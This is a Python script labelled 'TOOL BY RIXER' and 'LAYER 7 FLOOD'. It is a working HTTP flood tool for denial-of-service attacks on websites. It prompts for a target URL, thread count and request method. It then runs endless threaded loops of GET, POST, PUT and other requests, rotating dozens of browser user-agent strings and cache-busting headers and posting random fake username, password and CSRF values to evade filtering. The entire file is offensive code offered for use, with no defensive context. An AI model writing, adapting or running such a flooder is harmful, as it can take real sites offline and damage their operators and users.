import requests
import threading
import random
import time
import sys
import colorama
from colorama import Fore, Style, init
from urllib.parse import urlparse

init(autoreset=True)

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Android 11; Mobile; rv:89.0) Gecko/89.0 Firefox/89.0",
    "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10; Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36 Edg/90.0.818.66",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
    "Mozilla/5.0 (Android 9; Mobile; rv:68.0) Gecko/68.0 Firefox/88.0",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:91.0) Gecko/20100101 Firefox/91.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
    "Mozilla/5.0 (Android 12; Mobile; rv:91.0) Gecko/91.0 Firefox/91.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/92.0.902.62",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 11; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.105 Mobile Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0"
]

common_headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
}

http_methods = {
    1: 'GET',
    2: 'POST',
    3: 'HEAD',
    4: 'PUT',
    5: 'DELETE',
    6: 'OPTIONS',
    7: 'PATCH',
    0: 'RANDOM'
}

def generate_post_data():
    return {
        'username': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=10)),
        'password': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789!@#$%', k=12)),
        'csrf_token': ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=32)),
        'data': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=100))
    }

def layer7_attack(url, method):
    session = requests.Session()
    parsed = urlparse(url)
    while True:
        try:
            headers = common_headers.copy()
            headers['User-Agent'] = random.choice(user_agents)
            headers['Cache-Control'] = random.choice(['no-cache', 'no-store', 'max-age=0'])
            
            if method == 'GET':
                session.get(url, headers=headers, timeout=10)
            elif method == 'HEAD':
                session.head(url, headers=headers, timeout=10)
            elif method == 'OPTIONS':
                session.options(url, headers=headers, timeout=10)
            elif method in ['POST', 'PUT', 'PATCH', 'DELETE']:
                data = generate_post_data()
                if method == 'POST':
                    session.post(url, headers=headers, data=data, timeout=10)
                elif method == 'PUT':
                    session.put(url, headers=headers, data=data, timeout=10)
                elif method == 'PATCH':
                    session.patch(url, headers=headers, json=data, timeout=10)
                elif method == 'DELETE':
                    session.delete(url, headers=headers, timeout=10)
            else:
                rand_method = random.choice(list(http_methods.values())[1:])
                layer7_attack(url, rand_method)
                continue
        except:
            pass
        time.sleep(random.uniform(0.1, 1.0))

def main_menu():
    print(Fore.RED + Style.BRIGHT + "TOOL BY RIXER" + Style.RESET_ALL)
    print(Fore.YELLOW + "="*40 + Style.RESET_ALL)
    print(Fore.GREEN + "LAYER 7 FLOOD PYDROID3" + Style.RESET_ALL)
    print(Fore.YELLOW + "="*40 + Style.RESET_ALL)
    
    target_url = input(Fore.CYAN + "URL: " + Style.RESET_ALL).strip()
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'https://' + target_url
    
    thread_count = int(input(Fore.CYAN + "Threads: " + Style.RESET_ALL))
    
    print(Fore.MAGENTA + "1 GET 2 POST 3 HEAD 4 PUT 5 DEL 6 OPT 7 PAT 0 RAND" + Style.RESET_ALL)
    method_choice = int(input(Fore.CYAN + "Method: " + Style.RESET_ALL))
    selected_method = http_methods[method_choice]
    
    print(Fore.RED + f"FLOOD {target_url} | {thread_count} TH | {selected_method}" + Style.RESET_ALL)
    print(Fore.YELLOW + "CTRL+C STOP" + Style.RESET_ALL)
    
    threads = []
    for i in range(thread_count):
        t = threading.Thread(target=layer7_attack, args=(target_url, selected_method))
        t.daemon = True
        t.start()
        threads.append(t)
    
    try:
        while True:
            time.sleep(1)
            print(f"\r{Fore.GREEN}ACTIVE: {threading.active_count()-1}{Style.RESET_ALL}", end='')
    except KeyboardInterrupt:
        print(Fore.RED + "\nSTOPPED" + Style.RESET_ALL)
        sys.exit(0)

if __name__ == "__main__":
    main_menu()
